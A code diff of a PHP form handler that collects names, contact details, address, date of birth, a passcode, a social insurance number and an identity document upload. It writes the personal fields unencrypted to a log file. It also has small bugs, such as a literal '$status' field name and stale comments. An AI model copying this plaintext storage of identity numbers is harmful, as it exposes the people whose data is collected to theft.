@@ -14,17 +14,44 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Extract the data from the form
     $passcode = getPostData('passcode');
     $firstName = getPostData('firstName');
-    $lastName = getPostData('name'); // Assuming 'name' is for the last name
-    $email = getPostData('phone'); // Assuming 'phone' is for the email
+    $lastName = getPostData('lastName'); // Assuming 'name' is for the last name
+    $email = getPostData('email'); // Assuming 'phone' is for the email
     $phone = getPostData('phone');
     $dateOfBirth = getPostData('dateOfBirth');
-    // ... (continue for other fields)
+
+    $streetNumber = getPostData('streetNumber');
+    $streetName = getPostData('streetName');
+    $apt = getPostData('apt');
+    $city = getPostData('city');
+    $province = getPostData('province');
+    $postalCode = getPostData('postalCode');
+
+    $status = getPostData('$status');
+    $sin = getPostData('sin');
 
     // Prepare the log entry
-    $logEntry = "Passcode: $passcode, First Name: $firstName, Last Name: $lastName, Email: $email, Phone: $phone, Date of Birth: $dateOfBirth\n";
+    $logEntry = [
+        'firstName' => $firstName,
+        'lastName' => $lastName,
+        'email' => $email,
+        'phone' => $phone,
+        'dob-yyyy-mm-dd' => $dateOfBirth,
+        'address' => [
+            'streetNumber' => $streetNumber,
+            'streetName' => $streetName,
+            'apt' => $apt,
+            'city' => $city,
+            'province' => $province,
+            'postalCode' => $postalCode,
+        ],
+        'kyc' => [
+            'status' => $status,
+            'sin' => $sin,
+        ]
+    ];
 
     // Write to log file
-    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
+    file_put_contents($logFile, json_encode($logEntry), FILE_APPEND | LOCK_EX);
 
     // Handle file upload
     if (isset($_FILES['identity']) && $_FILES['identity']['error'] == 0) {
